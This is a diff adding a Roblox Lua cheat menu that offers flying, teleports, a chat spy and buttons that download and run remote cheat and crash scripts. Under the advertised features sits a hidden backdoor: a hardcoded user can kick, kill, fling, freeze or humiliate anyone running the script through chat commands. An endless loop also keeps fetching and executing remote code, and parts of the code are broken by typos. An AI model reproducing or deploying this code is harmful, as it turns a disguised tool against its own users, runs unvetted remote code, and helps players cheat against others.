@@ -1,0 +1,713 @@
+local L_3_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/minoww/Ray-UI/main/Ray%20UI"))()
+local L_4_ = L_3_.CreateLib("R.W Cash GUI", "Sentinel")
+
+local L_7_ = L_4_:NewTab("Main Stuff")
+local L_8_ = L_7_:NewSection("https://discord.gg/EBZfGSvGvb")
+L_8_:NewButton(
+    "Fly",
+    "Fly around like Jesus",
+    function()
+	local L_152_
+	local L_153_ = game.Players.LocalPlayer
+	IYMouse = L_153_:GetMouse()
+	IYMouse.KeyDown:connect(
+            function(L_154_arg0)
+		if L_154_arg0 == "x" then
+			if L_152_ then
+				L_152_ = false
+				fly()
+			else
+				L_152_ = true
+				NOFLY()
+			end
+		end
+	end
+        )
+	for L_155_forvar0, L_156_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+		if L_156_forvar1:IsA("BasePart") and L_156_forvar1.CanCollide == true then
+			L_156_forvar1.CanCollide = false
+		end
+	end
+	FLYING = false
+	QEfly = true
+	iyflyspeed = 7
+	vehicleflyspeed = 7
+	function sFLY(L_157_arg0)
+		repeat
+			wait()
+		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
+                game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+		repeat
+			wait()
+		until IYMouse
+		local L_158_ = game.Players.LocalPlayer.Character.LowerTorso
+		local L_159_ = {
+			F = 0,
+			B = 0,
+			L = 0,
+			R = 0,
+			Q = 0,
+			E = 0
+		}
+		local L_160_ = {
+			F = 0,
+			B = 0,
+			L = 0,
+			R = 0,
+			Q = 0,
+			E = 0
+		}
+		local L_161_ = 5
+		local function L_162_func()
+			FLYING = true
+			local L_163_ = Instance.new("BodyGyro", L_158_)
+			local L_164_ = Instance.new("BodyVelocity", L_158_)
+			L_163_.P = 9e4
+			L_163_.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+			L_163_.cframe = L_158_.CFrame
+			L_164_.velocity = Vector3.new(0, 0, 0)
+			L_164_.maxForce = Vector3.new(9e9, 9e9, 9e9)
+			spawn(
+                    function()
+				repeat
+					wait()
+					if not L_157_arg0 and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+						game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand =
+                                    true
+					end
+					if L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0 then
+						L_161_ = 50
+					elseif not (L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0) and L_161_ ~= 0 then
+						L_161_ = 0
+					end
+					if L_159_.L + L_159_.R ~= 0 or L_159_.F + L_159_.B ~= 0 or L_159_.Q + L_159_.E ~= 0 then
+						L_164_.velocity =
+                                    (workspace.CurrentCamera.CoordinateFrame.lookVector * (L_159_.F + L_159_.B) +
+                                    workspace.CurrentCamera.CoordinateFrame *
+                                        CFrame.new(L_159_.L + L_159_.R, (L_159_.F + L_159_.B + L_159_.Q + L_159_.E) * 0.2, 0).p -
+                                    workspace.CurrentCamera.CoordinateFrame.p) *
+                                    L_161_
+						L_160_ = {
+							F = L_159_.F,
+							B = L_159_.B,
+							L = L_159_.L,
+							R = L_159_.R
+						}
+					elseif L_159_.L + L_159_.R == 0 and L_159_.F + L_159_.B == 0 and L_159_.Q + L_159_.E == 0 and L_161_ ~= 0 then
+						L_164_.velocity =
+                                    (workspace.CurrentCamera.CoordinateFrame.lookVector * (L_160_.F + L_160_.B) +
+                                    workspace.CurrentCamera.CoordinateFrame *
+                                        CFrame.new(L_160_.L + L_160_.R, (L_160_.F + L_160_.B + L_159_.Q + L_159_.E) * 0.2, 0).p -
+                                    workspace.CurrentCamera.CoordinateFrame.p) *
+                                    L_161_
+					else
+						L_164_.velocity = Vector3.new(0, 0, 0)
+					end
+					L_163_.cframe = workspace.CurrentCamera.CoordinateFrame
+				until not FLYING
+				L_159_ = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0,
+					Q = 0,
+					E = 0
+				}
+				L_160_ = {
+					F = 0,
+					B = 0,
+					L = 0,
+					R = 0,
+					Q = 0,
+					E = 0
+				}
+				L_161_ = 0
+				L_163_:destroy()
+				L_164_:destroy()
+				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
+				end
+			end
+                )
+		end
+		IYMouse.KeyDown:connect(
+                function(L_165_arg0)
+			if L_165_arg0:lower() == "w" then
+				if L_157_arg0 then
+					L_159_.F = vehicleflyspeed
+				else
+					L_159_.F = iyflyspeed
+				end
+			elseif L_165_arg0:lower() == "s" then
+				if L_157_arg0 then
+					L_159_.B = -vehicleflyspeed
+				else
+					L_159_.B = -iyflyspeed
+				end
+			elseif L_165_arg0:lower() == "a" then
+				if L_157_arg0 then
+					L_159_.L = -vehicleflyspeed
+				else
+					L_159_.L = -iyflyspeed
+				end
+			elseif L_165_arg0:lower() == "d" then
+				if L_157_arg0 then
+					L_159_.R = vehicleflyspeed
+				else
+					L_159_.R = iyflyspeed
+				end
+			elseif QEfly and L_165_arg0:lower() == "e" then
+				if L_157_arg0 then
+					L_159_.Q = vehicleflyspeed * 2
+				else
+					L_159_.Q = iyflyspeed * 2
+				end
+			elseif QEfly and L_165_arg0:lower() == "q" then
+				if L_157_arg0 then
+					L_159_.E = -vehicleflyspeed * 2
+				else
+					L_159_.E = -iyflyspeed * 2
+				end
+			end
+		end
+            )
+		IYMouse.KeyUp:connect(
+                function(L_166_arg0)
+			if L_166_arg0:lower() == "w" then
+				L_159_.F = 0
+			elseif L_166_arg0:lower() == "s" then
+				L_159_.B = 0
+			elseif L_166_arg0:lower() == "a" then
+				L_159_.L = 0
+			elseif L_166_arg0:lower() == "d" then
+				L_159_.R = 0
+			elseif L_166_arg0:lower() == "e" then
+				L_159_.Q = 0
+			elseif L_166_arg0:lower() == "q" then
+				L_159_.E = 0
+			end
+		end
+            )
+		L_162_func()
+	end
+	function NOFLY()
+		FLYING = false
+		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").PlatformStand = true
+	end
+	function fly()
+		NOFLY()
+		wait()
+		sFLY()
+	end
+    end
+)
+L_8_:NewButton(
+    "Chat Logs",
+    "Spy on skids",
+    function()
+	 enabled = true --chat "/spy" to toggle!
+	spyOnMyself = true --if true will check your messages too
+	public = false --if true will chat the logs publicly (fun, risky)
+	publicItalics = true --if true will use /me to stand out
+	privateProperties = { --customize private logs
+		Color = Color3.fromRGB(135, 0, 232); 
+		Font = Enum.Font.SourceSansBold;
+		TextSize = 18;
+	}
+
+
+	local StarterGui = game:GetService("StarterGui")
+	local Players = game:GetService("Players")
+	local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+	local instance = (_G.chatSpyInstance or 0) + 1
+	_G.chatSpyInstance = instance
+
+	local function onChatted(p,msg)
+		if _G.chatSpyInstance == instance then
+			if p==player and msg:lower():sub(1,4)=="/spy" then
+				enabled = not enabled
+				wait(0.3)
+				privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+				StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+			elseif enabled and (spyOnMyself==true or p~=player) then
+				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+				local hidden = true
+				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+						hidden = false
+					end
+				end)
+				wait(1)
+				conn:Disconnect()
+				if hidden and enabled then
+					if public then
+						saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+					else
+						privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+						StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+					end
+				end
+			end
+		end
+	end
+
+	for _,p in ipairs(Players:GetPlayers()) do
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end
+	Players.PlayerAdded:Connect(function(p)
+		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+	end)
+	privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+	StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+	if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
+	local chatFrame = player.PlayerGui.Chat.Frame
+	chatFrame.ChatChannelParentFrame.Visible = true
+	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+end
+)
+L_8_:NewButton(
+    "Anti Bag",
+    "Never get Bagged",
+    function()
+        local LocalPlayer = game:GetService("Players").LocalPlayer
+	    local char = LocalPlayer.Character
+	    char.ChildAdded:Connect(function(sock)
+		if sock:IsA("MeshPart") then do
+				wait(0)
+				sock:Destroy()
+		end
+		end
+		end)
+end
+)
+L_8_:NewButton(
+    "Headless (CLIENT)",
+    "Perm",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Headless", true))()
+end
+)
+L_8_:NewButton(
+    "Korblox (CLIENT)",
+    "Spy on skids",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Invooker11/Koblox-and-Headless/main/Right%20Leg", true))()
+end
+)
+local L_13_ = L_4_:NewTab("Other Scripts")
+local L_14_ = L_13_:NewSection("https://discord.gg/EBZfGSvGvb")
+L_14_:NewKeybind(
+    "Keybind Gui Toggle",
+    "h",
+    Enum.KeyCode.V,
+    function()
+	L_3_:ToggleUI()
+end
+)
+L_14_:NewButton(
+    "UnJail",
+    "Quick",
+    function()
+	if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value >= 125 then
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
+		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-270.94, 20.327, -242.38)
+		wait()
+		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
+		wait(.1)
+		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
+		fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Key] - $125"].ClickDetector)
+		repeat
+			wait()
+		until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
+		local Hum = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+		if Hum.Health > 0 then
+			key1 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Key]")
+			if key1 then
+				Hum:EquipTool(key1)
+				for i, v in pairs(game:GetService"Players".LocalPlayer.Character:GetChildren()) do
+					if v:isA("Tool") then
+						game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(key1)
+						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
+						v:Activate()
+					end
+				end
+			end
+		end
+	end
+end
+)
+L_14_:NewButton(
+    "Mask Player",
+    "Hide Display",
+    function()
+        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+	local k = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
+	if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
+		wait(.2)
+		fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
+		toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
+		toolf.Parent = game.Players.LocalPlayer.Character
+		wait()
+		game.Players.LocalPlayer.Character:WaitForChild("Mask")
+		game:GetService("VirtualUser"):ClickButton1(Vector2.new())
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
+	end
+end
+)
+L_14_:NewButton(
+    "Anti AFK",
+    "Never get Kicked",
+    function()
+        local vu = game:GetService("VirtualUser")
+	game:GetService("Players").LocalPlayer.Idled:connect(function()
+		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		wait(1)
+		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+	end)
+end
+)
+local L_15_ = L_4_:NewTab("Teleports")
+local L_16_ = L_15_:NewSection("https://discord.gg/EBZfGSvGvb")
+L_16_:NewButton(
+    "Admin Base",
+    "spawns you at admin base",
+    function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-874.903992, -32.6492004, -525.215698)
+end
+)
+L_16_:NewButton(
+    "Armor",
+    "spawns you at armor",
+    function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            CFrame.new(-934.73651123047, -28.492471694946, 565.99884033203)
+end
+)
+L_16_:NewButton(
+    "Food",
+    "spawns you at food",
+    function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            CFrame.new(-788.39318847656, -39.649200439453, -935.27795410156)
+end
+)
+L_16_:NewButton(
+    "AK bush",
+    "spawns you at bush",
+    function()
+	local L_196_ = Instance.new("Animation")
+	function stopTracks()
+		for L_197_forvar0, L_198_forvar1 in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks(
+
+            ) do
+			if L_198_forvar1.Animation.AnimationId:match("rbxassetid") then
+				L_198_forvar1:Stop()
+			end
+		end
+	end
+	function loadAnimation(L_199_arg0)
+		if L_196_.AnimationId == L_199_arg0 then
+			L_196_.AnimationId = "1"
+		else
+			L_196_.AnimationId = L_199_arg0
+			local L_200_ =
+                    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(L_196_)
+			L_200_:Play()
+		end
+	end
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+            CFrame.new(
+            -626.288757,
+            7.99984694,
+            -772.322632,
+            -0.997374237,
+            -1.67662592e-10,
+            -0.0724197701,
+            -1.00076274e-10,
+            1,
+            -9.36886457e-10,
+            0.0724197701,
+            -9.27178945e-10,
+            -0.997374237
+        )
+	loadAnimation("rbxassetid://3152378852")
+	wait(1.2)
+	stopTracks()
+end
+)
+L_16_:NewButton(
+    "Bank",
+    "spawns you at Bank",
+    function()
+        game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-434.60995483398, 38.971572875977, -284.18685913086)
+end
+)
+L_16_:NewButton(
+    "Mask",
+    "spawns you at mask",
+    function()
+        game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-210.255, 21.674, -823.16)
+end
+)
+local L_17_ = L_4_:NewTab("Cash Stuff")
+local L_18_ = L_17_:NewSection("https://discord.gg/EBZfGSvGvb")
+L_18_:NewButton(
+    "AutoDrop GUI",
+    "Not Mine",
+    function()
+        loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
+end
+)
+L_18_:NewButton(
+    "AutoCounter GUI",
+    "Not Mine",
+    function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
+end
+)
+L_18_:NewButton(
+    "SwagMode Crash GUI",
+    "Not Mine",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
+end
+)
+L_18_:NewButton(
+    "Target GUI",
+    "Not Mine",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GS21Official/DH-VictimMenu-Script/main/Dh%20VictimMenu%3A%20Script"))()
+end
+)
+
+local user_premium__001 = game.Players.cartlvamp
+--// Replace "User101" with your username (NOT DISPLAY) //--
+
+--// Premium Commands //--
+local freeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+end
+
+local unfreeze = function()
+	game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+end
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kick .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked by Premium user")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":fling .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+			power = 99999999 -- change this to make it more or less powerful
+ 
+			game:GetService('RunService').Stepped:connect(function()
+			game.Players.LocalPlayer.Character.Head.CanCollide = false
+			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+			end)
+			wait(.1)
+			local bambam = Instance.new("BodyThrust")
+			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+			bambam.Force = Vector3.new(power,0,power)
+			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":benx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			wait(0) local A_1 = "oopsie" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
+			local benxed = true
+			while benxed == true do
+				hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+				pcall(function()
+    					hummy.Parent.Pants:Destroy()
+				end)
+				pcall(function()
+    					hummy.Parent.Shirt:Destroy()
+				end)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = user_premium__001.Character.HumanoidRootPart.CFrame + user_premium__001.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+				wait(0.1)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+			end
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unbenx .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			benxPos = player.Character.HumanoidRootPart.CFrame
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(7)
+			player.Character.HumanoidRootPart.CFrame = benxPos
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			freeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ban .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer:kick("PERMA BAN")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kill .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":premcmds") then
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":void .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":bring .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave .") then
+		if game.Players.LocalPlayer ~= user_premium__001 then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":grave me") then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":ungrave me") then
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			wait(0.1)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":kick me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			game.Players.LocalPlayer:Kick("Kicked yourself")
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":freeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			freeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":unfreeze me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end)
+
+user_premium__001.Chatted:connect(function(cht)
+	if cht:match(":thaw me") then
+		if game.Players.LocalPlayer == user_premium__001 then
+			unfreeze()
+		end
+	end
+
+end
+)
+
+while true do
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/minoww/whitelist/main/whitelist",true))();
+    end
